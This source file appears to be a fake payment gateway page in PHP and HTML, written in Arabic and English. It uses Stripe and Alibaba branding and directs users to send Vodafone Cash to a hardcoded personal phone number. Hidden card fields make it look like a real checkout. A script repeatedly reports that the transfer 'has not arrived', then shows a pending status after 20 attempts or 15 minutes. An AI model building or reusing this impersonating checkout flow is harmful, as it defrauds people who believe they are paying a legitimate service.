<?php
session_start();
require 'config.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

$user_id = $_SESSION['user_id'];
$payment_number = '01552729859'; // رقم فودافون كاش

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // حفظ المبلغ المدخل في الجلسة
    $amount = isset($_POST['amount']) && $_POST['amount'] > 0 ? $_POST['amount'] : 300;
    $phone_number = $_POST['phone_number'];
    $payment_method = $_POST['payment_method'];
    
    // تخزين البيانات في الجلسة حتى تحقق الشروط
    $_SESSION['amount'] = $amount;
    $_SESSION['phone_number'] = $phone_number;
    $_SESSION['payment_method'] = $payment_method;
}

?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <link rel="icon" href="Stripe-logo.png" type="image/png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
    <style>
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .overlay-content {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 90%;
            max-width: 400px;
            /* إضافة عرض مرن */
            max-width: 100%;
        }

        .button {
            padding: 10px 20px;
            margin-top: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .button:hover {
            background-color: #0056b3;
        }

        .timer {
            font-size: 24px;
            font-weight: bold;
            color: red;
        }

        .hidden {
            display: none;
        }

        .flex {
            flex-direction: column; /* تغيير الاتجاه إلى عمودي */
        }

        .w-1/2 {
            width: 100%; /* جعل العرض 100% على الشاشات الصغيرة */
        }

        @media (min-width: 640px) {
            .flex {
                flex-direction: row; /* العودة إلى الاتجاه الأفقي على الشاشات الأكبر */
            }
            .w-1/2 {
                width: 50%; /* عرض 50% على الشاشات الأكبر */
            }
        }

        /* إضافة تحسينات للعرض على الهواتف */
        @media (max-width: 640px) {
            .overlay-content {
                width: 90%; /* جعل العرض 90% على الشاشات الصغيرة */
            }
            .bg-white {
                padding: 4px; /* تقليل الحشوة على الشاشات الصغيرة */
            }
            .text-4xl {
                font-size: 2rem; /* تقليل حجم الخط */
            }
        }
    </style>
</head>
<body class="bg-gray-100 font-roboto">

    <!-- المربع الذي يظهر بعد الضغط على زر PAY -->
    <div id="paymentOverlay" class="overlay">
        <div class="overlay-content">
            <p>يرجى تحويل المبلغ <span id="amountText"></span> إلى الرقم: <span id="paymentNumber">01552729859</span></p>
            <button class="button" onclick="copyToClipboard('paymentNumber')">نسخ الرقم</button>
            <button class="button" onclick="copyToClipboard('amountText')">نسخ المبلغ</button>
            <button class="button" id="confirmButton" onclick="confirmTransfer()">تم التحويل</button>
            <p class="timer" id="timer">15:00</p>
            <p id="statusMessage"></p>
        </div>
    </div>

    <div class="flex justify-center items-center min-h-screen">
        <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-4xl flex">
            <div class="w-1/2 flex flex-col items-center">
                <div class="flex items-center mb-4">
                    <i class="fas fa-building text-gray-500"></i>
                    <span class="ml-2 text-gray-700">alibaba1.000</span>
                    <span class="ml-2 bg-yellow-400 text-xs text-white px-2 py-1 rounded">payment_gateway</span>
                </div>
                <div class="text-gray-500 mb-2">HI</div>
                <div class="text-4xl font-bold mb-4">
                    £<span id="amountDisplay">300.00</span>
                </div>
                <div class="mb-4">
                    <input class="w-full border border-gray-300 rounded px-3 py-2 mt-1 text-4xl font-bold" id="amount" value="300.00" name="amount" type="number" min="300"/> 
                </div>
                <button class="bg-gray-200 text-gray-700 px-4 py-2 rounded mb-8" onclick="updateAmount()">Change amount</button>
                <img alt="Logo of a hooded figure with red and black colors" class="w-48 h-48" height="200" src="alibaba-group-710666.jpg" width="200"/>
            </div>
            <div class="w-1/2 pl-8">
                <form onsubmit="showOverlay(); return false;">
                    <input type="hidden" name="payment_method" id="payment_method" value="vodafone_cash">

                   

                    <!-- زر طريقة الدفع لفودافون كاش -->
                    <div class="bg-yellow-400 text-center py-2 rounded text-white font-bold mb-4 cursor-pointer" id="vodafoneCashButton" onclick="setPaymentMethod('vodafone_cash'); highlightSelected('vodafoneCashButton')">
                        <i class="fas fa-mobile-alt"></i>
                        Vodafone Cash
                    </div>

                    <div class="flex flex-col items-center mb-4">
                        <span class="text-gray-700">Or pay another way</span>
                    </div>

                    <!-- زر طريقة الدفع للتحويل البنكي -->
                    <div class="bg-gray-200 text-center py-2 rounded text-gray-700 font-bold mb-4 cursor-pointer" id="bankTransferButton" onclick="setPaymentMethod('bank_transfer'); highlightSelected('bankTransferButton')">
                        <i class="fab fa-paypal"></i>
                        Bank Transfer
                    </div>

                    <div class="mb-4">
                        <label class="block text-gray-700" for="phone">Phone Number</label>
                        <input class="w-full border border-gray-300 rounded px-3 py-2 mt-1" id="phone" name="phone_number" placeholder="Enter your phone number" type="text" required/>
                    </div>
                    <div class="mb-4" style="visibility: hidden;"> <!-- Hidden Email Field -->
                        <label class="block text-gray-700" for="email">
                            Email
                        </label>
                        <input class="w-full border border-gray-300 rounded px-3 py-2 mt-1" id="email" type="email"/>
                    </div>
                    <div class="mb-4" style="visibility: hidden;"> <!-- Hidden Payment Method -->
                        <label class="block text-gray-700">
                            Payment method
                        </label>
                        <div class="flex mt-1">
                            <button class="flex-1 bg-white border border-gray-300 rounded-l px-4 py-2 text-gray-700">
                                Card
                            </button>
                            <button class="flex-1 bg-white border border-gray-300 rounded-r px-4 py-2 text-gray-700">
                                Revolut Pay
                            </button>
                        </div>
                    </div>
                    <div class="mb-4" style="visibility: hidden;"> <!-- Hidden Card Information -->
                        <label class="block text-gray-700" for="card-info">
                            Card information
                        </label>
                        <div class="flex mt-1">
                            <input class="flex-1 border border-gray-300 rounded-l px-3 py-2" id="card-info" placeholder="1234 1234 1234 1234" type="text"/>
                            <input class="w-1/4 border border-gray-300 px-3 py-2" placeholder="MM / YY" type="text"/>
                            <input class="w-1/4 border border-gray-300 rounded-r px-3 py-2" placeholder="CVC" type="text"/>
                        </div>
                        <div class="flex justify-end mt-1">
                            <img alt="Visa, MasterCard, and other card logos" height="20" src="https://oaidalleapiprodscus.blob.core.windows.net/private/org-BVbpSZmLndA7MfHIxv2ahIKS/user-IBY8IaMXtVn7IVIdZeyvjx16/img-KICOSIoNbwRyc0XzWWbHmJl0.png?st=2024-09-07T05%3A27%3A32Z&amp;se=2024-09-07T07%3A27%3A32Z&amp;sp=r&amp;sv=2024-08-04&amp;sr=b&amp;rscd=inline&amp;rsct=image/png&amp;skoid=d505667d-d6c1-4a0a-bac7-5c84a87759f8&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skt=2024-09-06T21%3A52%3A58Z&amp;ske=2024-09-07T21%3A52%3A58Z&amp;sks=b&amp;skv=2024-08-04&amp;sig=2kSKaRF5xjM0LTd7qkab4JDD8aM35x7jZCEnLyb523c%3D" width="100"/>
                        </div>
                    </div>
                    <div class="mb-4" style="visibility: hidden;"> <!-- Hidden Cardholder Name -->
                        <input class="w-full border border-gray-300 rounded px-3 py-2 mt-1" id="cardholder-name" placeholder="Full name on card" type="text"/>
                    </div>
                    <div class="mb-4" style="visibility: hidden;"> <!-- Hidden Country or Region -->
                        <select class="w-full border border-gray-300 rounded px-3 py-2 mt-1" id="country">
                            <option>
                                Egypt
                            </option>
                            <!-- Add other countries as needed -->
                        </select>
                    </div>
                    <div class="mb-4" style="visibility: hidden;"> <!-- Hidden Save Information -->
                        <label class="block text-gray-700">
                            Securely save my information for 1-click checkout
                        </label>
                    </div>
                    <button type="submit" class="bg-blue-600 text-white w-full py-3 rounded text-lg font-bold">
                        Pay £<span id="payAmount">300.00</span>
                    </button>
                </form>
            </div>
        </div>
    </div>

    <script>
        let attempts = 0;
        const maxAttempts = 20;
        const waitTime = 15 * 60 * 1000; // 15 minutes
        const timerElement = document.getElementById('timer');
        const statusMessage = document.getElementById('statusMessage');
        const startTime = Date.now();

        function updateAmount() {
            const amountInput = document.getElementById('amount');
            const newAmount = amountInput.value;
            document.getElementById('amountDisplay').innerText = newAmount;
            document.getElementById('payAmount').innerText = newAmount;
        }

        function showOverlay() {
            const amount = document.getElementById('amount').value;
            document.getElementById('amountText').innerText = amount;
            document.getElementById('paymentOverlay').style.display = 'flex';
            startTimer();
        }

        function copyToClipboard(id) {
            const text = document.getElementById(id).innerText;
            navigator.clipboard.writeText(text).then(() => {
                alert('تم نسخ ' + text);
            });
        }

        function confirmTransfer() {
            attempts++;
            if (attempts >= maxAttempts || Date.now() - startTime >= waitTime) {
                statusMessage.innerText = "طلب الإيداع معلق. سيتم إضافة الرصيد إلى حسابك خلال 24 ساعة.";
                
                // إرسال البيانات إلى process_request.php وتحقق النجاح
                saveToDatabase();
            } else {
                statusMessage.innerText = "لم يصل تحويلك بعد.";
            }
        }

        function startTimer() {
            const countdown = setInterval(() => {
                const elapsed = Date.now() - startTime;
                const remaining = waitTime - elapsed;

                if (remaining <= 0) {
                    clearInterval(countdown);
                    confirmTransfer(); // عند انتهاء الوقت
                } else {
                    const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                    const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
                    timerElement.innerText = `${minutes}:${seconds.toString().padStart(2, '0')}`;
                }
            }, 1000);
        }

        // إرسال البيانات إلى process_request.php
        function saveToDatabase() {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "process_request.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            const params = `amount=${document.getElementById('amount').value}&phone_number=${document.getElementById('phone').value}&payment_method=${document.getElementById('payment_method').value}&status=pending`;
            
            xhr.onload = function() {
                if (xhr.status === 200 && xhr.responseText === "تم تسجيل الطلب بنجاح.") {
                    // تم التسجيل بنجاح، الانتقال إلى صفحة الداشبورد
                    window.location.href = "dashboard.php";
                } else {
                    // حدث خطأ أثناء التسجيل
                    statusMessage.innerText = "حدث خطأ أثناء تسجيل الطلب.";
                }
            };

            xhr.send(params);
        }

        function highlightSelected(selectedId) {
            const buttons = [document.getElementById('vodafoneCashButton'), document.getElementById('bankTransferButton')];
            buttons.forEach(button => {
                if (button.id === selectedId) {
                    button.classList.remove('ring-2', 'ring-blue-500'); // إزالة تأثير التحديد
                }
            });
        }
    </script>

</body>
</html>
